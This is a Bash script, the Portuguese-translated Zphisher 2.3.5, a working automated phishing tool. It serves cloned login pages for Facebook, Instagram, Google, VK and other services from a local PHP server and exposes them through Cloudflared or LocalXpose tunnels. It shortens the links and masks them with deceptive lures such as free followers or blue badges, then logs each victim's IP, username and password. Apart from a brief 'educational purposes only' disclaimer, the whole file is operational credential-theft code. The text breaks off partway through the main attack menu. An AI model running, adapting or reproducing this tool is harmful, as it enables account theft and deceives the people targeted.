#!/bin/bash

##   Zphisher 	: 	Ferramenta Automatizada de Phishing
##   Autor 	: 	TAHMID RAYAT 
##   Versão 	: 	2.3.5
##   Github 	: 	https://github.com/htr-tech/zphisher


##                   LICENÇA PÚBLICA GERAL GNU
##                    Versão 3, 29 de junho de 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Todos têm permissão para copiar e distribuir cópias literais
##    deste documento de licença, mas não é permitido alterá-lo.
##
##                         Preambulo
##
##    A Licença Pública Geral GNU é uma licença gratuita e copyleft para
##    software e outros tipos de obras.
##
##    As licenças da maioria dos softwares e outras obras práticas são projetadas
##    para tirar sua liberdade de compartilhar e alterar as obras. Em contraste,
##    a Licença Pública Geral GNU destina-se a garantir sua liberdade para
##    compartilhar e alterar todas as versões de um programa—para garantir que ele permaneça software livre para todos os seus usuários. Nós, a Free Software Foundation, usamos a
##    Licença Pública Geral GNU para a maioria de nosso software; ela se aplica também a
##    qualquer outra obra lançada desta forma por seus autores. Você pode aplicá-la aos
##    seus programas também.
##
##    Quando falamos de software livre, estamos nos referindo à liberdade, não
##    ao preço. Nossas Licenças Públicas Gerais são projetadas para garantir que você
##    tenha a liberdade de distribuir cópias de software livre (e cobrar por elas se desejar),
##    que você receba o código-fonte ou possa obtê-lo se quiser, que você possa alterar
##    o software ou usar partes dele em novos programas livres, e que você saiba que
##    pode fazer essas coisas.
##
##    Para proteger seus direitos, precisamos impedir que outros os neguem ou peçam que você
##    renuncie a esses direitos. Portanto, você tem certas responsabilidades se
##    distribuir cópias do software, ou se modificá-lo: responsabilidades de
##    respeitar a liberdade dos outros.
##
##    Por exemplo, se você distribuir cópias de tal programa, seja
##    gratuitamente ou por uma taxa, você deve transmitir aos destinatários as mesmas
##    liberdades que recebeu. Você deve garantir que eles também recebam ou possam
##    obter o código-fonte. E você deve mostrar a eles estes termos para que eles
##    conheçam seus direitos.
##
##    Os desenvolvedores que usam a GPL protegem seus direitos com duas etapas:
##    (1) afirmar direitos autorais sobre o software e (2) oferecer a você esta Licença
##    dando-lhe permissão legal para copiar, distribuir e/ou modificá-lo.
##
##    Para a proteção dos desenvolvedores e autores, a GPL explica claramente
##    que não há garantia para este software livre. Para o bem dos usuários e
##    autores, a GPL exige que versões modificadas sejam marcadas como
##    alteradas, para que seus problemas não sejam atribuídos erroneamente aos
##    autores das versões anteriores.
##
##    Alguns dispositivos são projetados para negar aos usuários acesso para instalar ou executar
##    versões modificadas do software dentro deles, embora o fabricante
##    possa fazê-lo. Isso é fundamentalmente incompatível com o objetivo de
##    proteger a liberdade dos usuários de alterar o software. O padrão sistemático
##    de tal abuso ocorre na área de produtos para indivíduos usarem, que é
##    precisamente onde é mais inaceitável. Portanto, projetamos esta versão
##    da GPL para proibir a prática para esses produtos. Se tais problemas surgirem
##    substancialmente em outros domínios, estamos preparados para estender esta
##    disposição a esses domínios em versões futuras, conforme necessário para proteger
##    a liberdade dos usuários.
##
##    Finalmente, todo programa é constantemente ameaçado por patentes de software.
##    Estados não devem permitir que patentes restrinjam o desenvolvimento e uso de
##    software em computadores de uso geral, mas naqueles que o fazem, queremos
##    evitar o perigo especial de que patentes aplicadas a um programa livre possam
##    torná-lo efetivamente proprietário. Para prevenir isso, a GPL assegura que
##    patentes não possam ser usadas para tornar o programa não-livre.
##
##    Os termos e condições precisos para copiar, distribuir e
##    modificar seguem.
##
##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
##

##   AGRADECIMENTOS A :
##   1RaY-1 - https://github.com/1RaY-1
##   Aditya Shakya - https://github.com/adi1090x
##   Ali Milani Amin - https://github.com/AliMilani
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Moises Tapia - https://github.com/MoisesTapia
##   Mr.Derek - https://github.com/E343IO
##   Mustakim Ahmed - https://github.com/bdhackers009
##   TheLinuxChoice - https://twitter.com/linux_choice


__version__="2.3.5"

## HOST & PORTA PADRÃO
HOST='127.0.0.1'
PORT='8080' 

## Cores ANSI (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Diretórios
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remover arquivo de log
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Término do script
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Resetar cores do terminal
reset_color() {
	tput sgr0   # resetar atributos
	tput op     # resetar cor
	return
}

## Finalizar processo já em execução
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Verifica o Processo
			killall ${process} > /dev/null 2>&1 # Encerra o Processo
		fi
	done
}

# Verificar se há uma versão mais recente
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualização: "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}atualização encontrada\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando Atualização..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Erro ao extrair."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute zphisher novamente\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Erro ao baixar."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}atualizado\n${WHITE}" ; sleep .5
	fi
}

## Verificar status da Internet
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet: "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} ______      _     _     _               
		${ORANGE}|___  /     | |   (_)   | |              
		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Versão : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Ferramenta criada por htr-tech (tahmid.rayat)${WHITE}
	EOF
}

## Banner pequeno
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
	EOF
}

## Dependências
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já instalados."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado, instale manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Baixar binários
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar ${output}."
		{ reset_color; exit 1; }
	fi
}

## Instalar Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared já instalado."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Instalar LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose já instalado."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Mensagem de saída
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## Sobre
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Autor    ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
		${GREEN} Versão   ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Aviso:${RESETBG}
		${CYAN}  Esta ferramenta é feita apenas para fins educacionais ${RED}!${WHITE}${CYAN} O autor não será responsável por 
		  qualquer uso indevido desta ferramenta ${RED}!${WHITE}
		
		${WHITE} ${CYANBG}Agradecimentos Especiais a:${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
		  Yisus7u7

		${RED}[${WHITE}00${RED}]${ORANGE} Menu Principal     ${RED}[${WHITE}99${RED}]${ORANGE} Sair

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; about; };;
	esac
}

## Escolher porta personalizada
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Deseja uma porta personalizada ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([sSyY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Insira sua porta personalizada de 4 dígitos [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Porta de 4 dígitos inválida : $CU_P, tente novamente...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Usando porta padrão $PORT...${WHITE}\n"
	fi
}

## Configurar site e iniciar servidor PHP
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configurando servidor..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Iniciando servidor PHP..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Capturar endereço IP
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP da vítima : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Capturar credenciais
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Conta : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Senha : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando próxima informação de login, ${BLUE}Ctrl + C ${ORANGE}para sair. "
}

## Exibir dados
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando informações de login, ${BLUE}Ctrl + C ${ORANGE}para sair..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP da vítima encontrado!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Informações de login encontradas!!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Iniciar Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lançando Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Crie uma conta em ${ORANGE}localxpose.io${GREEN} & copie o token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Insira o token do Loclx :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Você deve inserir o Token do Localxpose." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Iniciar LocalXpose (Novamente...)
start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Mudar região do servidor Loclx? ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "s" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lançando LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Iniciar localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hospedado com sucesso em : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Seleção de túnel
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detecta${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NOVO! Máx 15Min${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione um serviço de encaminhamento de porta : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Máscara de URL personalizada
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Deseja alterar a URL mascarada? ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "s" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Insira sua URL personalizada abaixo ${CYAN}(${ORANGE}Exemplo: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # texto inicial requer Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Usando URL Mascarada personalizada :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Tipo de URL inválido... Usando a padrão..."
		fi
	fi
}

## Encurtador de URL
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] Nenhuma URL fornecida / Regex não corresponde"
		url="Não foi possível gerar links. Tente novamente com o hotspot ativado"
		processed_url="Não foi possível encurtar URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Não foi possível"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de Login Tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de Votação Avançada
		${RED}[${WHITE}03${RED}]${ORANGE} Página de Segurança Falsa
		${RED}[${WHITE}04${RED}]${ORANGE} Página de Login do Facebook Messenger

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de Login Tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de Seguidores Automáticos
		${RED}[${WHITE}03${RED}]${ORANGE} Página de 1000 Seguidores
		${RED}[${WHITE}04${RED}]${ORANGE} Página de Verificação de Badge Azul

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de Login Antiga do Gmail
		${RED}[${WHITE}02${RED}]${ORANGE} Página de Login Nova do Gmail
		${RED}[${WHITE}03${RED}]${ORANGE} Votação Avançada

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de Login Tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de Votação Avançada

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Selecione um método de ataque para sua vítima ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
